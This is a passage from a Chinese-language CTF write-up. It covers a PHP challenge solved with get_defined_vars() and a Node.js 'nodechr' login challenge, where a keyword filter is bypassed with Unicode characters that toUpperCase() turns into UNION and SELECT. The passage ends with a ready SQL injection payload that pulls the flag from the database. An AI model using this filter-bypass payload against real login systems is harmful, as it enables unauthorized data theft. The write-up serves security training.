alt="image.png"></p><p>还有另一种解法是利用：<code>get_defined_vars()</code></p><pre class=" language-php"><code class="language-php"><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181306-04007e40-0052-1.png" alt="image.png"><br>那么我们可以再提交一个参数过去，再用<code>get_defined_vars()</code>函数去获取</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181731-a1c399be-0052-1.png" alt="image.png"></p><h1 id="5-easy-nodechr"><a href="#5-easy-nodechr" class="headerlink" title="5.easy - nodechr"></a>5.easy - nodechr</h1><p>代码太长了，这里就贴出关键代码吧</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//关键代码1：</span><span class="token keyword">function</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isString</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>keyword<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">(</span>union<span class="token operator">|</span>select<span class="token operator">|</span><span class="token punctuation">;</span><span class="token operator">|</span>\<span class="token operator">-</span>\<span class="token operator">-</span><span class="token punctuation">)</span><span class="token operator">/</span>is<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> keyword    <span class="token punctuation">}</span>    <span class="token keyword">return</span> undefined<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//关键代码2：</span><span class="token keyword">let</span> username <span class="token operator">=</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">let</span> password <span class="token operator">=</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">let</span> jump <span class="token operator">=</span> ctx<span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">&amp;&amp;</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span>db<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`SELECT * FROM "users" WHERE "username" = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>username<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">' AND "password" = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>password<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">'`</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> user        jump <span class="token operator">=</span> ctx<span class="token punctuation">.</span>router<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>很明显的sql注入，但是union，select被ban了，看着toUpperCase()这个很是诡异，再加上ph师傅给的tips，百度之，然后就百度到了ph师傅<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" title="这篇文章" target="_blank" rel="noopener">这篇文章</a><br>要点如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215191314-6a367202-005a-1.png" alt="image.png"><br>那么思路很清晰了，unıon.toUpperCase()==UNION，ſelect.toUpperCase()==SELECT</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215191754-11386b46-005b-1.png" alt="image.png"></p><p>接下来就是简单的注入了</p><pre><code>username=admin&amp;password=1%27 un%C4%B1on %C5%BFelect null,(%C5%BFelect flag from flags),'null</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215194640-16261d0c-005f-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215194703-23cd9624-005f-1.png" alt="image.png"></p><h1 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h1><p>这几道题目考察很多有意思的东西，也感谢ph师傅出这几道很Nice的题目，涨了不少姿势。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
